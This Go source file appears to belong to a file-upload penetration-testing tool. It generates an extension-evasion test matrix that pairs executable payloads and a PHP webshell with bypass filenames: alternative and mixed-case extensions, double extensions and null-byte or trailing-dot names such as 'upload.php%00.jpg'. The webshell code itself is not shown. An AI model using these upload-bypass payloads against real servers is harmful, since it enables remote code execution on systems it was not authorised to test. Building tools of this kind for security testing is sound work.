package payload

// moduleA generates the Extension Evasion test matrix.
func moduleA() []*Payload {
	var tests []*Payload

	// A1: Alternative executable extensions
	altExts := []struct {
		ext  string
		tags []string
	}{
		{".php5", []string{"php", "alt-ext"}},
		{".phtml", []string{"php", "alt-ext"}},
		{".phar", []string{"php", "phar"}},
		{".jspx", []string{"jsp", "alt-ext"}},
		{".ashx", []string{"asp.net", "handler"}},
		{".config", []string{"iis", "config"}},
	}

	for _, a := range altExts {
		payload := getPayloadForExtension(a.ext) // ✅ ACTUAL EXECUTABLE CODE
		tests = append(tests, &Payload{
			TestType:  TestTypeExtensionEvasion,
			Technique: "Alternative extension: " + a.ext,
			Filename:  "test" + a.ext,
			Extension: a.ext,
			Body:      payload,
			Tags:      a.tags,
		})
	}

	// A2: Case sensitivity variations
	caseExts := []string{".PhP", ".AsPx", ".JSP", ".PhAr", ".PHTML", ".pHp5"}
	for _, ext := range caseExts {
		payload := getPayloadForExtension(ext) // ✅ ACTUAL EXECUTABLE CODE
		tests = append(tests, &Payload{
			TestType:  TestTypeExtensionEvasion,
			Technique: "Case sensitivity: " + ext,
			Filename:  "test" + ext,
			Extension: ext,
			Body:      payload,
			Tags:      []string{"case-sensitivity"},
		})
	}

	// A3: Double/nested extensions (using PHP webshell as default)
	doubleExts := []struct {
		filename  string
		technique string
	}{
		{"image.jpg.php", "Double extension (jpg.php) - back validation bypass"},
		{"photo.png.php5", "Double extension (png.php5) - back validation bypass"},
		{"doc.pdf.phar", "Double extension (pdf.phar) - back validation bypass"},
		{"shell.php.jpg", "Reverse double extension (php.jpg) - Apache misconfig"},
		{"exec.php.png", "Reverse double extension (php.png) - Apache misconfig"},
		{"page.aspx.gif", "Reverse double extension (aspx.gif) - IIS misconfig"},
		{"file.php.xxxunknown", "Double extension with unknown trailing (php.xxxunknown)"},
		{"upload.php%00.jpg", "Null byte in extension (php%00.jpg) - path truncation"},
		{"test.php\x00.jpg", "Raw null byte in extension (php\\x00.jpg)"},
		{"avatar.pHp5 ", "Mixed case alt-extension with trailing space"},
		{"file.JsPx ", "Mixed case extension with trailing space"},
		{"data.php....", "Multiple trailing dots"},
	}

	for _, d := range doubleExts {
		// Copy PHP webshell into payload body
		body := make([]byte, len(phpWebshell))
		copy(body, phpWebshell) // ✅ ACTUAL PHP WEBSHELL

		tests = append(tests, &Payload{
			TestType:  TestTypeExtensionEvasion,
			Technique: d.technique,
			Filename:  d.filename,
			Extension: extractExtension(d.filename),
			Body:      body,
			Tags:      []string{"double-extension", "validation-discrepancy"},
		})
	}

	return tests
}
